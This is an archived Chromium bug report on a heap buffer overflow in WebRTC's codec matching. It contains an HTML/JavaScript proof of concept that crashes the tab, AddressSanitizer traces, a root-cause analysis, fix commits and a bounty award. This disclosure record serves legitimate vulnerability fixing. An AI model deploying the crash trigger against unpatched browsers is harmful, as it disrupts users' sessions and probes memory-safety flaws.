# Security: WebRtc - Heap Buffer Overflow in cricket::Codec::Matches()

| Field | Value |
|-------|-------|
| **Issue ID** | [40088980](https://issues.chromium.org/issues/40088980) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>WebRTC>Audio |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | lo...@gmail.com |
| **Assignee** | zh...@chromium.org |
| **Created** | 2017-09-11 |
| **Bounty** | $1,000.00 |

## Description


VULNERABILITY DETAILS
	Steps to reproduce:
	
	1.Open PoC BOF_CodecMatches_Repro.html in Chrome browser ASAN build.
	2.ASAN reports a Heap Buffer Overflow in cricket::Codec::Matches().

		=================================================================
		==24136==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x07f70744 at pc 0x19714329 bp 0x227bd96c sp 0x227bd960
		READ of size 4 at 0x07f70744 thread T16

			#0 0x19714328 in cricket::Codec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:105


VERSION
	Chrome Version: Chromium	63.0.3212.0 (Developer Build) (32-bit) 
	Operating System: Windows 10 / Ubuntu16.04 LTS 

REPRODUCTION CASE  (BOF_CodecMatches_Repro.html)
	<html><script>
	var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" },  ] };
	var options = {optional:[{DtlsSrtpKeyAgreement:false}, {RtpDataChannels: true}]};
	var pc0 = new RTCPeerConnection(rtcConfig,options);
	var context = new AudioContext();
	pc0.createDataChannel("DataChanName1");;
	context.onstatechange = function() {
	pc0.createOffer(function(offer) {
	pc0.setRemoteDescription(new RTCSessionDescription(offer)); 
	pc0.createAnswer(function(answer) {pc0.setLocalDescription(new RTCSessionDescription(answer));}, function(){});
	}, function(e) {});
	}
	pc0.onnegotiationneeded = function(e) {pc0.addStream(context.createMediaStreamDestination().stream);}
	setInterval(function(){context.suspend();}, 1);
	</script></html>


FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab
Crash State: 

	=================================================================
	==24136==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x07f70744 at pc 0x19714329 bp 0x227bd96c sp 0x227bd960
	READ of size 4 at 0x07f70744 thread T16

		#0 0x19714328 in cricket::Codec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:105
		#1 0x19715464 in cricket::AudioCodec::Matches C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:186
		#2 0x1bd67121 in cricket::FindMatchingCodec<cricket::AudioCodec> C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:837
		#3 0x1bd5e95d in cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:2103
		#4 0x1bd5cdae in cricket::MediaSessionDescriptionFactory::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\mediasession.cc:1499
		#5 0x19a0bd8b in webrtc::WebRtcSessionDescriptionFactory::InternalCreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsessiondescriptionfactory.cc:413
		#6 0x19a0b505 in webrtc::WebRtcSessionDescriptionFactory::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsessiondescriptionfactory.cc:301
		#7 0x19929ca6 in webrtc::PeerConnection::CreateAnswer C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\peerconnection.cc:906
		#8 0x198af94b in webrtc::MethodCall2<webrtc::PeerConnectionInterface,void,webrtc::CreateSessionDescriptionObserver *,const webrtc::PeerConnectionInterface::RTCOfferAnswerOptions &>::OnMessage C:\b\c\b\win_asan_release\src\third_party\webrtc\api\proxy.h:246
		#9 0x17a2fc85 in webrtc::internal::SynchronousMethodCall::OnMessage C:\b\c\b\win_asan_release\src\third_party\webrtc\api\proxy.h:141
		#10 0x19a56380 in jingle_glue::JingleThreadWrapper::Dispatch C:\b\c\b\win_asan_release\src\jingle\glue\thread_wrapper.cc:157
		#11 0x19a5775b in jingle_glue::JingleThreadWrapper::RunTask C:\b\c\b\win_asan_release\src\jingle\glue\thread_wrapper.cc:279
		#12 0x134e20e2 in base::internal::Invoker<base::internal::BindState<void (net::QuicChromiumClientSession::*)(unsigned int) __attribute__((thiscall)),base::WeakPtr<net::QuicChromiumClientSession>,unsigned int>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:331
		#13 0x12c8133a in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:59
		#14 0x12d043b2 in base::internal::IncomingTaskQueue::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\incoming_task_queue.cc:143
		#15 0x12b9e595 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:406
		#16 0x12b9f6b0 in base::MessageLoop::DeferOrRunPendingTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:417
		#17 0x12ba00a7 in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:524
		#18 0x12d0a853 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:33
		#19 0x12b9d754 in base::MessageLoop::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:346
		#20 0x12c1dadd in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:123
		#21 0x12b98fba in base::Thread::Run C:\b\c\b\win_asan_release\src\base\threading\thread.cc:255
		#22 0x12b993d9 in base::Thread::ThreadMain C:\b\c\b\win_asan_release\src\base\threading\thread.cc:338
		#23 0x12b3d059 in base::`anonymous namespace'::ThreadFunc C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:89
		#24 0x106e441 in __asan::AsanThread::ThreadStart e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_thread.cc:259
		#25 0x106d44d in asan_thread_start e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:136
		#26 0x75d462c3 in BaseThreadInitThunk+0x23 (C:\Windows\System32\KERNEL32.DLL+0x162c3)
		#27 0x772b0f68 in RtlSubscribeWnfStateChangeNotification+0x438 (C:\Windows\SYSTEM32\ntdll.dll+0x60f68)
		#28 0x772b0f33 in RtlSubscribeWnfStateChangeNotification+0x403 (C:\Windows\SYSTEM32\ntdll.dll+0x60f33)

	0x07f70744 is located 12 bytes to the right of 56-byte region [0x07f70700,0x07f70738)
	allocated by thread T0 here:
		#0 0x107462c in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:60
		#1 0x1ce44cab in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:19
		#2 0x19908d6c in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::_Reallocate c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1601
		#3 0x19908ca4 in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::_Reserve c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1631
		#4 0x19908a29 in std::vector<cricket::DataCodec,std::allocator<cricket::DataCodec> >::push_back c:\b\c\win_toolchain\vs_files\f53e4598951162bad6330f7a167486c7ae5db1e5\vc\include\vector:1290
		#5 0x198ee57a in webrtc::ParseContent C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsdp.cc:2869
		#6 0x198d4e26 in webrtc::SdpDeserialize C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\webrtcsdp.cc:863
		#7 0x198845db in webrtc::CreateSessionDescription C:\b\c\b\win_asan_release\src\third_party\webrtc\pc\jsepsessiondescription.cc:123
		#8 0x17a2cbd2 in content::PeerConnectionDependencyFactory::CreateSessionDescription C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:437
		#9 0x178fa16e in content::RTCPeerConnectionHandler::CreateNativeSessionDescription C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:2164
		#10 0x178f8fc0 in content::RTCPeerConnectionHandler::SetLocalDescription C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:1398
		#11 0x1c85da07 in blink::RTCPeerConnection::setLocalDescription C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:697
		#12 0x1c3bcaec in blink::V8RTCPeerConnection::setLocalDescriptionMethodCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8RTCPeerConnection.cpp:1493
		#13 0x105f025d in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#14 0x1084fd77 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#15 0x1084cba1 in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:142
		#16 0x1084c031 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	Thread T16 created by T0 here:
		#0 0x106d532 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:146
		#1 0x12b3c83c in base::PlatformThread::CreateWithPriority C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:207
		#2 0x12b98689 in base::Thread::StartWithOptions C:\b\c\b\win_asan_release\src\base\threading\thread.cc:112
		#3 0x12b982b1 in base::Thread::Start C:\b\c\b\win_asan_release\src\base\threading\thread.cc:75
		#4 0x17a28a05 in content::PeerConnectionDependencyFactory::CreatePeerConnectionFactory C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:176
		#5 0x17a28719 in content::PeerConnectionDependencyFactory::GetPcFactory C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:135
		#6 0x17a2adf7 in content::PeerConnectionDependencyFactory::CreatePeerConnection C:\b\c\b\win_asan_release\src\content\renderer\media\webrtc\peer_connection_dependency_factory.cc:287
		#7 0x178f4032 in content::RTCPeerConnectionHandler::Initialize C:\b\c\b\win_asan_release\src\content\renderer\media\rtc_peer_connection_handler.cc:1251
		#8 0x1c85a1e0 in blink::RTCPeerConnection::RTCPeerConnection C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:523
		#9 0x1c85604e in blink::RTCPeerConnection::Create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\peerconnection\RTCPeerConnection.cpp:472
		#10 0x1c3c6766 in blink::V8RTCPeerConnection::constructorCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8RTCPeerConnection.cpp:1635
		#11 0x105f025d in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:25
		#12 0x1084e30b in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:112
		#13 0x1084cb4c in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:138
		#14 0x1084c031 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:130

	SUMMARY: AddressSanitizer: heap-buffer-overflow C:\b\c\b\win_asan_release\src\third_party\webrtc\media\base\codec.cc:105 in cricket::Codec::Matches
	Shadow bytes around the buggy address:
	  0x30fee090: 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee0a0: fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa
	  0x30fee0b0: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
	  0x30fee0c0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee0d0: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
	=>0x30fee0e0: 00 00 00 00 00 00 00 fa[fa]fa fa fa fd fd fd fd
	  0x30fee0f0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee100: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
	  0x30fee110: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
	  0x30fee120: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd
	  0x30fee130: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
	Shadow byte legend (one shadow byte represents 8 application bytes):
	  Addressable:           00
	  Partially addressable: 01 02 03 04 05 06 07 
	  Heap left redzone:       fa
	  Freed heap region:       fd
	  Stack left redzone:      f1
	  Stack mid redzone:       f2
	  Stack right redzone:     f3
	  Stack after return:      f5
	  Stack use after scope:   f8
	  Global redzone:          f9
	  Global init order:       f6
	  Poisoned by user:        f7
	  Container overflow:      fc
	  Array cookie:            ac
	  Intra object redzone:    bb
	  ASan internal:           fe
	  Left alloca redzone:     ca
	  Right alloca redzone:    cb
	==24136==ABORTING





## Attachments

- [BOF_CodecMatches_Repro.html](attachments/BOF_CodecMatches_Repro.html) (text/plain, 741 B)

## Timeline

### cl...@chromium.org (2017-09-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6511412624228352.

### np...@chromium.org (2017-09-11)

Does repro on CF linux bot. I'll try it on Windows bot.

### cl...@chromium.org (2017-09-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5223154095226880.

### np...@chromium.org (2017-09-11)

I meant does NOT repro on Linux. It does repro on Windows -- report from CF is in progress. 

[Monorail components: Blink>WebRTC>Audio]

### cl...@chromium.org (2017-09-11)

Detailed report: https://clusterfuzz.com/testcase?key=5223154095226880

Job Type: windows_asan_chrome
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x22d51784
Crash State:
  cricket::Codec::Matches
  cricket::AudioCodec::Matches
  cricket::FindMatchingCodec<cricket::AudioCodec>
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=496140:496160

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5223154095226880

See https://github.com/google/clusterfuzz-tools for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### np...@chromium.org (2017-09-11)

Cc'ing based on regression-range CL owners.

### np...@chromium.org (2017-09-11)

[Empty comment from Monorail migration]

### mm...@chromium.org (2017-09-11)

Henrik, could you please help to find an owner?

### sh...@chromium.org (2017-09-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-12)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-09-12)

[Empty comment from Monorail migration]

### zh...@chromium.org (2017-09-12)

I'll take a look.

### de...@chromium.org (2017-09-13)

Here's what's going on, in short:

1. SetRemoteDescription("m=application...");
2. SetLocalDescription("m=application...");
3. SetRemoteDescription("m=audio...m=application...");
4. CreateAnswer

CreateAnswer is hitting this DCHECK because the m= section at index 0 in the local description is "m=application", but the m= section at index 0 in the remote description is "m=audio". So the code ends up trying to create an audio m= section in the answer using the codecs from the previous local description (in the m=application section), and hits the DCHECK when the types mismatch.

This remote description shouldn't have been accepted in the first place; the order of m= sections has to remain constant in subsequent offers/answers. But it looks like we've been accepting it. I'm sure it's just that the code was designed for Plan B SDP, using methods like "GetFirstAudioContent", and didn't care about indices until now.

So in summary, to fix this issue we should start rejecting re-offers that attempt to change the order of m= sections, doing something similar to this code: https://cs.chromium.org/chromium/src/third_party/webrtc/pc/webrtcsession.cc?dr&l=142

We still may have an issue with recycling m= sections... though we can fix that separately.

### sh...@chromium.org (2017-09-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-14)

This issue is marked as a release blocker with no OS labels associated. Please add an appropriate OS label.

All release blocking issues should have OS labels associated to it, so that the issue can tracked and promptly verified, once it gets fixed.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### zh...@chromium.org (2017-09-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-09-14)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9

commit 2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Thu Sep 14 17:49:19 2017

Reject the descriptions that attempt to change the order of m= sections
in current local description.

When setting the descriptions, the order of m= sections would be compared
against existing m= sections and an error would be returned if the order
doesn't match.

Previously reviewed on: https://codereview.webrtc.org/3012313002/

BUG=chromium:763842
TBR=deadbeef@webrtc.org

Change-Id: I577e3424830b0a4c5ecd5524923873e30ad23d43
Reviewed-on: https://webrtc-review.googlesource.com/1200
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Reviewed-by: Zhi Huang <zhihuang@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#19842}
[modify] https://crrev.com/2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9/webrtc/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9/webrtc/pc/webrtcsession.cc
[modify] https://crrev.com/2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9/webrtc/pc/webrtcsession.h
[modify] https://crrev.com/2a5e4268f821ef7e3a0fb59bc4d40b8af04ec4f9/webrtc/pc/webrtcsession_unittest.cc


### zh...@chromium.org (2017-09-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-15)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-09-15)

This bug requires manual review: M62 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2017-09-16)

ClusterFuzz has detected this issue as fixed in range 502199:502221.

Detailed report: https://clusterfuzz.com/testcase?key=5223154095226880

Job Type: windows_asan_chrome
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x22d51784
Crash State:
  cricket::Codec::Matches
  cricket::AudioCodec::Matches
  cricket::FindMatchingCodec<cricket::AudioCodec>
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=496140:496160
Fixed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=502199:502221

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5223154095226880

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-09-16)

ClusterFuzz testcase 5223154095226880 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-09-16)

[Empty comment from Monorail migration]

### ab...@google.com (2017-09-18)

Thanks for the fix - approving merge to M62. Branch:3202
+awhalley@

### bu...@chromium.org (2017-09-18)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/78df91eab40f75ee75ecd056ebf71ea0b08f5c53

commit 78df91eab40f75ee75ecd056ebf71ea0b08f5c53
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Mon Sep 18 19:03:44 2017

Reject the descriptions that attempt to change the order of m= sections
in current local description.

When setting the descriptions, the order of m= sections would be compared
against existing m= sections and an error would be returned if the order
doesn't match.

Previously reviewed on: https://codereview.webrtc.org/3012313002/

BUG=chromium:763842

Change-Id: I7c9d1693ad991aa34fc49f76547fcbe900129645
Reviewed-on: https://webrtc-review.googlesource.com/1500
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Cr-Commit-Position: refs/branch-heads/62@{#11}
Cr-Branched-From: 85e6a4ba1372f21b8648ffaad2fd19a76a8bb316-refs/heads/master@{#19592}
[modify] https://crrev.com/78df91eab40f75ee75ecd056ebf71ea0b08f5c53/webrtc/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/78df91eab40f75ee75ecd056ebf71ea0b08f5c53/webrtc/pc/webrtcsession.cc
[modify] https://crrev.com/78df91eab40f75ee75ecd056ebf71ea0b08f5c53/webrtc/pc/webrtcsession.h
[modify] https://crrev.com/78df91eab40f75ee75ecd056ebf71ea0b08f5c53/webrtc/pc/webrtcsession_unittest.cc


### cl...@chromium.org (2017-09-18)

ClusterFuzz has detected this issue as fixed in range 502199:502221.

Detailed report: https://clusterfuzz.com/testcase?key=5223154095226880

Job Type: windows_asan_chrome
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x22d51784
Crash State:
  cricket::Codec::Matches
  cricket::AudioCodec::Matches
  cricket::FindMatchingCodec<cricket::AudioCodec>
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=496140:496160
Fixed: https://clusterfuzz.com/revisions?job=windows_asan_chrome&range=502199:502221

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5223154095226880

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### aw...@chromium.org (2017-09-18)

[Empty comment from Monorail migration]

### ab...@chromium.org (2017-09-20)

Merged. Removing Approved label. 

### aw...@chromium.org (2017-09-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-09-22)

Congrats - $1,000 for this report - cheers!

### aw...@chromium.org (2017-09-22)

[Empty comment from Monorail migration]

### aw...@google.com (2017-10-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### is...@google.com (2018-03-27)

This issue was migrated from crbug.com/chromium/763842?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088980)*
